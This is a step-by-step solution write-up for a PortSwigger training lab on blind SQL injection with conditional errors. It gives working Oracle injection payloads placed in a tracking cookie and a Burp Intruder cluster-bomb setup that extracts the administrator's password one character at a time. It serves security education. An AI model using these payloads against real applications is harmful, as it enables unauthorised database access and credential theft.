# Lab-12: [Blind SQL injection with conditional errors](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. 

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message. 

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user. 

**Aim :-** To solve the lab, log in as the administrator user. 



## Solution
- Confirm SQLi
    - Capture the request in burp suite and add ``` ' ``` in the end of the **TrackingId cookie** and check the response.
    
    - The server respond with a **Internal Server Error** means there is SQL injection possible.
    
    - ``` '||(SELECT '' FROM dual)||' ```(valid Oracle query) payload gives a **200 OK** response and ``` '||(SELECT '' FROM not-a-real-table)||' ```(invalid Oracle query) gives a **Internal Server Error** confirms **Oracle** database and vulnerable for SQLi


- Confirm **users** table exist
    - Use the payload ``` '||(SELECT '' FROM users WHERE ROWNUM = 1)||' ``` to confirm **users** table
        - The query retrieves a empty string from the **users** table, ``` WHERE ROWNUM = 1 ``` confirms only one row is returned 

    - The server responds with a **200 OK** status code confirms the query executed without any errors. Means that the existens of **users** table


- Confirm **administrator** user in the table
    - Use the payload ``` '||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' ``` to confirm ``` administrator ``` user
        
    - This payload causes a deliberate database error only if the ``` administrator ``` user exists, confirming the presence of the ``` administrator ``` user


- Find the number of **characters** in the ``` administrator ``` password
    - ``` '||(SELECT CASE WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' ``` 
        - The payload checks whether the password is greater than 2 character, if the password is greater than 2 the server respond with a **Internal Server Error**

    - Change the number 2 untill the server respond with a **200 OK** status code.

    - ``` '||(SELECT CASE WHEN LENGTH(password)>20 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' ``` while using **20** gives a **200 OK** response, confirms **20 characters** in the password.


- Retrieve the ``` administrator ``` Password
    - ``` '||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' ```
        - The payload ``` SUBSTR(password,1,1)='a' ``` extract a single character from the ``` administrator ``` password and compare with the given character ``` (a) ```
        
    - If the both characters are equal then the server responds with a **Internal Server Error**

    - Send the request to **Intruder** and select the **Cluster bombing attack**

    - Select index position 1 from ``` SUBSTR(password,1,1)='a' ``` and click the **Add §** for select position 1, select the charector ``` a ``` and click **Add §** for select position 2. The payload will look like the following
    ``` '||(SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')|| ```

    - Configure the payload **position 1** to **1-20** and payload **position 2** to **0-1** also **a-z**, Start the attack

    - Check for the responses with **500 Status Code** ( Internal Server Error ) retrieve the characters that replaced in the payload **position 2** in the order of 1 - 20 from the payload position 1, combine all the characters will give the password of ``` administrator ```  
